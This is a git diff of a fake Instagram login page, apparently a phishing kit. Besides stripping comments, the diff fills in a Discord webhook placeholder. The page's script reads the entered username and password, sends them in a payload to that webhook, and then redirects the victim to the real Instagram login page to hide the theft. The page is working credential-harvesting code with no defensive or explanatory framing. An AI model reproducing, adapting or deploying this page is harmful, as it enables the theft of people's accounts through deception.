@@ -20,7 +20,7 @@
                   <img class="logo"
                     src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                     alt="Instagram">
-                </div><!-- Header end -->
+                </div>
                 <div class="form-wrap">
                   <form class="form">
 
@@ -36,7 +36,6 @@
                     </div>
 
                     <span class="button-box">
-                      <!-- Call sendMessage() function when the button is clicked -->
                       <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                     </span>
 
@@ -57,13 +56,13 @@
 
                     <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
                   </form>
-                </div> <!-- Form-wrap end -->
-              </div> <!-- Login-box end -->
+                </div>
+              </div> 
 
               <div class="login-box">
                 <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign
                     up</a></p>
-              </div> <!-- Signup-box end -->
+              </div>
 
               <div class="app">
                 <p>Get the app.</p>
@@ -77,14 +76,13 @@
                     href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=6%2C8%2C1371%2C633">
                     <img src="https://i.ibb.co/LrSp5Wj/EHY6-Qn-ZYd-NX.png">
                   </a>
-                </div> <!-- App-img end-->
-              </div> <!-- App end -->
-            </div> <!-- Content end -->
+                </div> 
+              </div> 
+            </div> 
           </article>
-        </div> <!-- Wrapper end -->
+        </div> 
       </main>
 
-      <!-- 2-Role Footer -->
       <footer class="footer" role="contentinfo">
         <div class="footer-container">
 
@@ -157,13 +155,12 @@
             <option value="Українська">Українська</option>
           </select>
           <span class="footer-logo">&copy; 2024 Instagram from Meta</span>
-        </div> <!-- Footer container end -->
+        </div> 
       </footer>
 
     </section>
-  </span> <!-- Root -->
+  </span>
 
-  <!-- Select Link -->
   <script type="text/javascript">
     function la(src) {
       window.location = src;
@@ -201,7 +198,7 @@
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
-        const webhookURL = ''; // Replace 'YOUR_WEBHOOK_URL' with your actual webhook URL
+        const webhookURL = '{DISCORD_WEBHOOK_URL}'; // Replace 'DISCORD_WEBHOOK_URL' with your actual webhook URL
 
         const payload = {
           embeds: [{
@@ -243,7 +240,6 @@
           console.log('Webhook sent successfully');
         }
 
-        // Redirect the user to Instagram login page
         window.location.replace("https://www.instagram.com/accounts/login/");
       } catch (error) {
         console.error('Error:', error);
